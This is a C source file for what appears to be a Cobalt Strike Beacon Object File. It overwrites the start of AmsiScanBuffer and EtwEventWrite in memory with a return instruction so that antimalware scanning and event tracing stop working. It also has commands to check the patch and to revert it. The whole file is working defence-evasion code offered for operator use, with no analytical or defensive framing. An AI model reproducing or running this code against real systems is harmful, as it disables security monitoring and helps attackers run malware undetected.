#include <windows.h>
#include "beacon.h"

#define NT_SUCCESS 0x00000000
#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )

//Import
DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA (LPCSTR);
DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA (LPCSTR);
DECLSPEC_IMPORT WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress (HMODULE, LPCSTR);
DECLSPEC_IMPORT WINBASEAPI int WINAPI MSVCRT$memcmp (void*, void*, size_t);
DECLSPEC_IMPORT WINBASEAPI int WINAPI MSVCRT$memcpy (void*, void*, size_t);
NTSYSAPI NTSTATUS NTAPI NTDLL$NtWriteVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
NTSYSAPI NTSTATUS NTAPI NTDLL$NtProtectVirtualMemory(HANDLE, PVOID, PULONG, ULONG, PULONG);



//Command
#define check 1
#define all 2
#define amsi 3
#define etw 4
#define revertAll 5
#define revertAmsi 6
#define revertEtw 7


BOOL loadedAMSI(){

    HMODULE h_AMSI = KERNEL32$GetModuleHandleA("amsi.dll");

    if(h_AMSI == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR , "AMSI.DLL is not loaded in current process.\n");
        return FALSE;
    }
    else
    {
        return TRUE;
    }
}


BOOL checkAMSI(){

    unsigned char cleanAMSI[] = { 0x4C, 0x8B, 0xDC, 0x49, 0x89, 0x5B, 0x08, 0x49, 0x89, 0x6B, 0x10, 0x49, 0x89, 0x73, 0x18 };

    HMODULE h_AMSI = KERNEL32$LoadLibraryA("amsi.dll");

    if(h_AMSI == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR , "Cannot load amsi.dll.\n");
        return -1;
    }


    void* pAMSIaddress = (void*)KERNEL32$GetProcAddress(h_AMSI, "AmsiScanBuffer");

    if(pAMSIaddress == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR , "Cannot get AmsiScanBuffer address.\n");
        return -1;
    }

    if (!MSVCRT$memcmp((void*)cleanAMSI, pAMSIaddress, sizeof(cleanAMSI))) //found clean bytes
    {
         return FALSE;

    } else
    {
        return TRUE;
    }

}


BOOL checkETW(){

    unsigned char cleanETW[] = { 0x4C, 0x8B, 0xDC, 0x48, 0x83, 0xEC, 0x58, 0x4D, 0x89, 0x4B, 0xE8, 0x33, 0xC0 };

    HMODULE h_NTDLL = KERNEL32$GetModuleHandleA("ntdll.dll");

    if(h_NTDLL == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR , "Cannot get ntdll.dll address.\n");
        return -1;
    }

    void* pETWaddress = (void*)KERNEL32$GetProcAddress(h_NTDLL, "EtwEventWrite");

    if(pETWaddress == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR , "Cannot get EtwEventWrite address.\n");
        return -1;
    }

    if (!MSVCRT$memcmp((PVOID)cleanETW, pETWaddress, sizeof(cleanETW))) //found clean bytes
    {
         return FALSE;

    } else
    {
        return TRUE;
    }


}



void patchitCheck(){

    if (loadedAMSI())
    {
        if(checkAMSI())
        {
            BeaconPrintf(CALLBACK_OUTPUT , "[+] AmsiScanBuffer is patched.\n");
        }
        else
        {
            BeaconPrintf(CALLBACK_OUTPUT , "[+] AmsiScanBuffer is NOT patched.\n");
        }
    }


    if(checkETW())
    {
        BeaconPrintf(CALLBACK_OUTPUT , "[+] EtwEventWrite is patched.\n");
    }
    else
    {
        BeaconPrintf(CALLBACK_OUTPUT , "[+] EtwEventWrite is NOT patched.\n");
    }
} 

void patchitAMSI(){

    BOOL patched = checkAMSI();
    unsigned char amsiPatch[] = { 0xC3 };
    ULONG OldProtection, NewProtection;
    SIZE_T uSize = sizeof(amsiPatch);
    NTSTATUS status;

    if (!patched)
    {

        void* pAMSIaddress = (void*)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("amsi.dll"), "AmsiScanBuffer");

        void* lpBaseAddress = pAMSIaddress;

        status = NTDLL$NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, PAGE_READWRITE, &OldProtection);

        if(status != NT_SUCCESS)
        {
            BeaconPrintf(CALLBACK_ERROR , "Failed to modify AmsiScanBuffer memory permission to READWRITE.");
            return;
        }


        status = NTDLL$NtWriteVirtualMemory(NtCurrentProcess(), pAMSIaddress, (PVOID)amsiPatch, sizeof(amsiPatch), NULL);
        if(status != NT_SUCCESS)
        {
            BeaconPrintf(CALLBACK_ERROR , "Failed to copy patch to AmsiScanBuffer.");
            return;
        }


        status = NTDLL$NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, OldProtection, &NewProtection);

        if(status != NT_SUCCESS)
        {
            BeaconPrintf(CALLBACK_ERROR, "Failed to modify AmsiScanBuffer memory permission to original state.");
            return;
        }

        //check again to see if above succeeded
        if(checkAMSI())
        {
            BeaconPrintf(CALLBACK_OUTPUT , "[+] AmsiScanBuffer is patched.\n");
        }
        else
        {
            BeaconPrintf(CALLBACK_OUTPUT , "[+] AmsiScanBuffer is NOT patched.\n");
        }

    }
    else
    {

        BeaconPrintf(CALLBACK_OUTPUT , "[+] AmsiScanBuffer was already patched, I did nothing.\n");
    }

}

void patchitETW(){

    BOOL patched = checkETW();
    unsigned char etwPatch[] = { 0xC3 };
    ULONG OldProtection, NewProtection;
    SIZE_T uSize = sizeof(etwPatch);
    NTSTATUS status;


    if (!patched)
    {

        void* pETWaddress = (void*)KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("ntdll.dll"), "EtwEventWrite");

        void* lpBaseAddress = pETWaddress;
        
        status = NTDLL$NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, PAGE_READWRITE, &OldProtection);

        if(status != NT_SUCCESS)
        {
            BeaconPrintf(CALLBACK_ERROR , "Failed to modify EtwEventWrite memory permission to READWRITE.");
            return;
        }


        status = NTDLL$NtWriteVirtualMemory(NtCurrentProcess(), pETWaddress, (PVOID)etwPatch, sizeof(etwPatch), NULL);

        if(status != NT_SUCCESS)
        {
            BeaconPrintf(CALLBACK_ERROR , "Failed to copy patch to EtwEventWrite.");
            return;
        }

        status = NTDLL$NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, OldProtection, &NewProtection);

        if(status != NT_SUCCESS)
        {
            BeaconPrintf(CALLBACK_ERROR, "Failed to modify EtwEventWrite memory permission to original state.");
            return;
        }

        
        //check again to see if above succeeded
        if(checkETW())
        {
            BeaconPrintf(CALLBACK_OUTPUT , "[+] EtwEventWrite is patched.\n");
        }
        else
        {
            BeaconPrintf(CALLBACK_OUTPUT , "[+] EtwEventWrite is NOT patched.\n");
        }

    }
    else
    {
        BeaconPrintf(CALLBACK_OUTPUT , "[+] EtwEventWrite was already patched, I did nothing.\n");
    }

}


void patchitAll(){
    patchitAMSI();
    patchitETW();
} 


void revertAMSI(){

    unsigned char cleanAMSI[] = { 0x4C, 0x8B, 0xDC, 0x49, 0x89, 0x5B, 0x08, 0x49, 0x89, 0x6B, 0x10, 0x49, 0x89, 0x73, 0x18 };
    ULONG OldProtection, NewProtection;
    SIZE_T uSize = sizeof(cleanAMSI);
    NTSTATUS status;

    if(loadedAMSI())
    {
        BOOL patched = checkAMSI();

        if (patched)
        {

            void* pAMSIaddress = (void*)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("amsi.dll"), "AmsiScanBuffer");

            void* lpBaseAddress = pAMSIaddress;


            status = NTDLL$NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, PAGE_READWRITE, &OldProtection);

            if(status != NT_SUCCESS)
            {
                BeaconPrintf(CALLBACK_ERROR , "Failed to modify AmsiScanBuffer memory permission to READWRITE.");
                return;
            }


            status = NTDLL$NtWriteVirtualMemory(NtCurrentProcess(), pAMSIaddress, (PVOID)cleanAMSI, sizeof(cleanAMSI), NULL);

            if(status != NT_SUCCESS)
            {
                BeaconPrintf(CALLBACK_ERROR , "Failed to copy clean patch to AmsiScanBuffer.");
                return;
            }


            status = NTDLL$NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, OldProtection, &NewProtection);

            if(status != NT_SUCCESS)
            {
                BeaconPrintf(CALLBACK_ERROR, "Failed to modify AmsiScanBuffer memory permission to original state.");
                return;
            }

            //check again to see if above succeeded
            if(!checkAMSI())
            {
                BeaconPrintf(CALLBACK_OUTPUT , "[+] AmsiScanBuffer is reverted to original.\n");
            }
            else
            {
                BeaconPrintf(CALLBACK_ERROR , "Failed to revert AmsiScanBuffer.");
            }

        }
        else
        {

            BeaconPrintf(CALLBACK_OUTPUT , "[+] AmsiScanBuffer was clean, I did nothing.\n");
        }       
    }

    

}

void revertETW(){

    BOOL patched = checkETW();
    unsigned char cleanETW[] = { 0x4C, 0x8B, 0xDC, 0x48, 0x83, 0xEC, 0x58, 0x4D, 0x89, 0x4B, 0xE8, 0x33, 0xC0 };
    ULONG OldProtection, NewProtection;
    SIZE_T uSize = sizeof(cleanETW);
    NTSTATUS status;

    if (patched)
    {

        void* pETWaddress = (void*)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("ntdll.dll"), "EtwEventWrite");

        void* lpBaseAddress = pETWaddress;

        status = NTDLL$NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, PAGE_READWRITE, &OldProtection);

        if(status != NT_SUCCESS)
        {
            BeaconPrintf(CALLBACK_ERROR , "Failed to modify EtwEventWrite memory permission to READWRITE.");
            return;
        }


        status = NTDLL$NtWriteVirtualMemory(NtCurrentProcess(), pETWaddress, (PVOID)cleanETW, sizeof(cleanETW), NULL);

        if(status != NT_SUCCESS)
        {
            BeaconPrintf(CALLBACK_ERROR , "Failed to copy clean patch to EtwEventWrite.");
            return;
        }


        status = NTDLL$NtProtectVirtualMemory(NtCurrentProcess(), (PVOID)&lpBaseAddress, (PULONG)&uSize, OldProtection, &NewProtection);

        if(status != NT_SUCCESS)
        {
            BeaconPrintf(CALLBACK_ERROR, "Failed to modify EtwEventWrite memory permission to original state.");
            return;
        }

        //check again to see if above succeeded
        if(!checkETW())
        {
            BeaconPrintf(CALLBACK_OUTPUT , "[+] EtwEventWrite is reverted to original.\n");
        }
        else
        {
            BeaconPrintf(CALLBACK_ERROR , "Failed to revert EtwEventWrite.");
        }

    }
    else
    {

        BeaconPrintf(CALLBACK_OUTPUT , "[+] EtwEventWrite was clean, I did nothing.\n");
    }

}


void revertALL(){
    revertAMSI();
    revertETW();
} 

void go(char * args, int len) {

    datap parser;
    BeaconDataParse(&parser, args, len);
    int command = BeaconDataInt(&parser);

    if (command == check)
    {
        patchitCheck();
    }
    else if (command == all)
    {
        patchitAll();
    }
    else if (command == amsi)
    {
        patchitAMSI();
    }
    else if (command == etw)
    {
        patchitETW();
    }
    else if (command == revertAll)
    {
        revertALL();
    }
    else if (command == revertAmsi)
    {
        revertAMSI();
    }
    else if (command == revertEtw)
    {
        revertETW();
    }

}